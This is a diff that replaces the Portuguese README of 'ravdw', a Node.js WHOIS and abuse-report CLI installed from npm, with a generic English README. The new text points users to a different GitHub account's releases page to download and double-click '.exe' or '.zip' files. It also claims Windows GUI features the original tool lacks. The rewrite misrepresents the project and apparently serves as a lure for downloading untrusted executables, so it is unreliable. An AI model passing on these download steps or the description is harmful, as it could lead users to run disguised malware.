@@ -1,234 +1,81 @@
+# 🔍 ravdw - Simple WHOIS and Reporting Tool
 
+## 🚀 Getting Started
 
-<div align="center">
+Welcome to ravdw! This application helps you look up WHOIS data and report suspicious contacts easily.
 
-<a href="https://www.npmjs.com/package/ravdw" target="_blank"><img src="https://img.shields.io/badge/-ravdw-c40404?style=flat-square&labelColor=c40404&logo=npm&logoColor=white&link=https://www.npmjs.com/package/ravdw" height="40" /></a>  
- <a href="https://www.npmjs.com/package/ravdw" target="_blank"><img alt="NPM Version" src="https://img.shields.io/npm/v/ravdw?style=flat-square&logo=npm&labelColor=c40404&color=c40404" height="40" ></a>
+## 🛠️ Features
 
----
+- **WHOIS Lookup:** Quickly fetch domain registration details.
+- **Contact Suggestions:** Get intelligent suggestions for reporting issues.
+- **Simple Reporting System:** Easily create and manage reports.
 
-# ⚙️ RAVDW
+## 📥 Download & Install
 
-### 🔍 Consulta WHOIS simples, 📬 Sugestões inteligentes de contatos para denúncia e 📄 Sistema simples de relatório.
+To download ravdw, visit the page below:
 
-[![⭐ Stars](https://img.shields.io/github/stars/ravenastar-js/ravdw?style=for-the-badge&label=%E2%AD%90%20Stars&color=2d7445&logo=star&logoColor=white&labelColor=444&radius=10)](https://github.com/ravenastar-js/ravdw/stargazers)
-[![🔱 Forks](https://img.shields.io/github/forks/ravenastar-js/ravdw?style=for-the-badge&label=%F0%9F%94%B1%20Forks&color=2d7445&logo=git&logoColor=white&labelColor=444&radius=10)](https://github.com/ravenastar-js/ravdw/network/members)
-[![📦 NPM Version](https://img.shields.io/npm/v/ravdw?style=for-the-badge&label=%F0%9F%93%A6%20NPM&color=2d7445&logo=npm&logoColor=white&labelColor=444&radius=10)](https://www.npmjs.com/package/ravdw)
-[![⚙️ Node.js](https://img.shields.io/badge/%E2%9A%99%EF%B8%8F%20Node.js-18.0%2B-green?style=for-the-badge&logo=nodedotjs&color=2d7445&logoColor=white&labelColor=444&radius=10)](https://nodejs.org)
-[![📄 License](https://img.shields.io/badge/%F0%9F%93%84%20License-MIT-blue?style=for-the-badge&logo=opensourceinitiative&color=2d7445&logoColor=white&labelColor=444&radius=10)](LICENSE)
+[![Download ravdw](https://img.shields.io/badge/Download%20ravdw-v1.0-blue.svg)](https://github.com/MEFSHSS/ravdw/releases)
 
-</div>
+### Steps to Download:
 
-![RavDW](media/ravdw.png)
+1. Click on the link above.
+2. You will be taken to the Releases page.
+3. Look for the latest release.
+4. Click on the asset that you want to download (e.g., `.exe`, `.zip`).
+5. Save the file to your computer.
 
-<div align="center">
-BANNER INSPIRADO EM
-<br>
-<a href="https://store.steampowered.com/app/1507580/Enigma_do_Medo" >
-  <img src="https://i.imgur.com/Gbyx94i.png" width="180">
-</a>
-</div>
+## 💻 System Requirements
 
----
+- **Operating System:** Windows 10 or later.
+- **CPU:** 1 GHz or faster.
+- **RAM:** 2 GB or more recommended.
+- **Disk Space:** At least 100 MB free.
 
-## 🎯 Visão Geral
+## 🛡️ Security
 
-**🔍 Consulta WHOIS simples, 📬 Sugestões inteligentes de contatos para denúncia e 📄 Sistema simples de relatório.**
+This application uses secure protocols to ensure your data stays safe during WHOIS lookups and report submissions.
 
-## 🌟 Características Principais
+## 🔧 How to Run
 
-- **🔍 Consulta WHOIS**: RDAP, WHOIS tradicional e Hackertarget
-- **📄 Gerador de Relatórios**: Denúncias para phishing, pirataria, LGPD, malware e mais
-- **🏠 Detecção Inteligente**: Identifica hospedagem gratuita e provedores
-- **🌐 Internacionalização**: Português e Inglês
-- **💬 Interface Amigável**: Modo interativo com menus intuitivos
-- **📊 Dados Consolidados**: Informações técnicas organizadas e relevantes
+After downloading:
 
-📦 Instalação Rápida
+1. Navigate to the folder where you saved the file.
+2. Double-click the application icon.
+3. Follow the on-screen instructions to start using the tool.
 
-<details>
-<summary>📥 Como instalar o NodeJS?</summary>
+## 🗺️ Usage
 
-- [COMO INSTALAR NODE JS NO WINDOWS?](https://youtu.be/-jft_9PlffQ)
-</details>
+1. **WHOIS Lookup:**
+   - Enter the domain name in the provided field.
+   - Click the "Lookup" button to get registration details.
 
-```bash
-npm i -g ravdw           # ✅ Recomendado
-npm install -g ravdw     # ✅ Completo
+2. **Contact Reporting:**
+   - Use the suggestions to identify suspicious contacts.
+   - Complete the reporting form and submit.
 
-# Após instalação, use em qualquer lugar:
-ravdw help
-ravdw --help
-```
+## 📊 Support
 
-### 🔍 VERIFICAR INSTALAÇÃO
+For any issues or questions, feel free to reach out through the Issues section on GitHub.
 
-```bash
-npm ls -g ravdw          # ✅ Listar pacote
-npm list -g ravdw        # ✅ Completo
-ravdw version            # ✅ Versão instalada
-ravdw --version          # ✅ Versão instalada
-```
+## ⚙️ Contributing
 
-## 🗑️ DESINSTALAR GLOBALMENTE
+You can help improve ravdw. If you're interested, check the guidelines in the repository to submit your suggestions and code.
 
-```bash
-npm un -g ravdw          # ✅ Recomendado  
-npm uninstall -g ravdw   # ✅ Completo
-npm remove -g ravdw      # ✅ Alternativo
-```
+## 📈 Feedback
 
-## 🎯 Como Usar
+We appreciate your feedback. It helps us make ravdw better for everyone. 
 
-### 🔍 Consulta Rápida de Domínio
+## 🌍 Related Topics
 
-```bash
-# Consulta básica
-ravdw exemplo.com
+- Cybersecurity
+- OSINT (Open Source Intelligence)
+- Security Tools
 
-# Consulta específica
-ravdw lookup exemplo.com
+Explore our topics to learn more about these areas.
 
-# Com timeout personalizado
-ravdw lookup exemplo.com --timeout=15000
-```
+## 📌 Important Links
 
-### 📄 Gerar Relatório de Denúncia
+- [Download ravdw](https://github.com/MEFSHSS/ravdw/releases) - Access the latest version.
+- [GitHub Repository](https://github.com/MEFSHSS/ravdw) - View the source code and documentation.
 
-```bash
-# Relatório interativo
-ravdw report exemplo.com
-
-# Relatório com opções específicas
-ravdw report exemplo.com --type=phishing --evidence=https://exemplo.com/fake-login
-
-# Múltiplas violações
-ravdw report exemplo.com --type=phishing,piracy,malware --evidence=url1,url2,url3
-```
-
-### 💬 Modo Interativo (Recomendado)
-
-```bash
-ravdw
-```
-
-### 🆘 Ajuda e Informações
-
-```bash
-# Ajuda completa
-ravdw help
-ravdw --help
-
-# Versão
-ravdw version
-ravdw --version
-```
-
-## 📋 Tipos de Violação Suportados
-
-| Violação | Emoji | Descrição |
-|----------|-------|-----------|
-| `phishing` | 🕵️ | Imitação de sites legítimos |
-| `piracy` | 🏴‍☠️ | Distribuição não autorizada |
-| `lgpd` | 📊 | Violação de proteção de dados |
-| `childporn` | 🚫 | Conteúdo de exploração infantil |
-| `hate` | 💢 | Discurso de ódio |
-| `scam` | 🎭 | Golpes financeiros |
-| `copyright` | 📝 | Violação de direitos autorais |
-| `malware` | 🦠 | Distribuição de malware |
-| `spam` | 📨 | Spam massivo |
-| `other` | ❓ | Outras violações |
-
-## 🏠 Provedores Detectados Automaticamente
-
-- **☁️ Cloudflare Pages** (`pages.dev`)
-- **🐙 GitHub Pages** (`github.io`) 
-- **▲ Vercel** (`vercel.app`)
-- **🎯 Netlify** (`netlify.app`)
-- **🔥 Firebase** (`web.app`)
-- **🔮 Glitch** (`glitch.me`)
-- **⚙️ Heroku** (`herokuapp.com`)
-- **📝 WordPress** (`wordpress.com`)
-- **✍️ Blogger** (`blogspot.com`)
-- **🌐 Weebly** (`weebly.com`)
-- **🆓 000webhost** (`000webhost.com`)
-
-## 📊 Exemplo de Saída
-
-### 🔍 Consulta WHOIS
-
-```text
-+----------------------------------------------------+
-|                                                    |
-|   📋 Informações do Domínio                       |
-|   Domínio: exemplo.com                              |
-|   Registrado em: 15/09/1997 às 01:00:00 (-03:00)   |
-|   Expira em: 14/09/2028 às 01:00:00 (-03:00)       |
-|   Atualizado em: 09/09/2019 às 12:39:04 (-03:00)   |
-|                                                    |
-+----------------------------------------------------+
-
-+---------------------------------------------------------+
-|                                                         |
-|   🏢 Informações do Registrador                         |
-|   Registrador: Exemplo Inc.                             |
-|   Email de Abuso: abuse@exemplo.com                     |
-|   Formulário: https://www.exemplo.com/contact-us/       |
-|                                                         |
-+---------------------------------------------------------+
-```
-
-### 📄 Relatório Gerado
-
-```text
-🧾 ABUSE REPORT - exemplo.com
-
-O domínio "exemplo.com", registrado por "MarkMonitor Inc.", está sendo utilizado para:
-• Phishing - imitação de sites legítimos para captura de credenciais
-
-📚 POSSÍVEIS LEIS APLICÁVEIS:
-• Art. 154-A do CP — Invasão de Dispositivo Informático
-• Art. 171, §2º-A do CP — Fraude Eletrônica
-
-🎯 PRÓXIMOS PASSOS RECOMENDADOS:
-  🌐 Arquive as evidências gratuitamente na Wayback Machine...
-  📸 Registre as evidências em plataformas confiáveis...
-```
-
-## 🏗️ Estrutura do Projeto
-
-```bash
-📁 ravdw/
-├── 📁 bin/
-│   └── 🔧 ravdw.js
-├── 📁 lib/
-│   ├── 🌐 index.js
-│   ├── 📄 lang.json
-│   └── 📁 core/ ⚙️
-│       ├── 🈲 i18n.js
-│       ├── 🗺️ SiteMap.js
-│       ├── 🛠️ utils.js
-│       └── 🔍 WhoisEngine.js
-├── 📁 commands/ 💬
-│   ├── 🔎 lookup.js
-│   ├── 📊 report.js
-│   └── 💬 interactive.js
-├── 📦 package.json
-├── 📖 README.md
-└── ⚙️ .gitignore
-```
-
-
-## 📄 Licença
-
-Este projeto está sob licença MIT. Veja o arquivo [LICENSE](LICENSE) para detalhes.
-
----
-
-<div align="center">
-
-## Feito com 💚 por [RavenaStar](https://linktr.ee/ravenastar)
-
-[⬆ Voltar ao topo](#%EF%B8%8F-ravdw)
-
-</div>
+Feel free to explore and enjoy using ravdw for your WHOIS lookups and reporting needs!
